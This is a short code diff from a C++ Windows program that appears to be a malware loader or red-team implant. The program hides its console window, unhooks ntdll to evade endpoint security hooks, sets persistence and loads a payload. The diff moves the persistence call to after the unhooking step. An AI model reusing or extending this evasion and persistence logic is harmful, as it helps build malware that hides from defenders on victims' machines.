@@ -16,7 +16,6 @@ int main(int argc, char** argv)
 {
 	ShowWindow(GetConsoleWindow(), SW_HIDE);
 	sleep();
-	persist();
 
 	HMODULE ntdll = LoadLibrary(TEXT("ntdll.dll"));
 	if (ntdll == NULL)
@@ -24,6 +23,7 @@ int main(int argc, char** argv)
 		exit(1);
 	}
 	unhookNtdll(ntdll);
+	persist();
 	loadNtdll(ntdll);
 
 	const std::string payload = loadPayload();
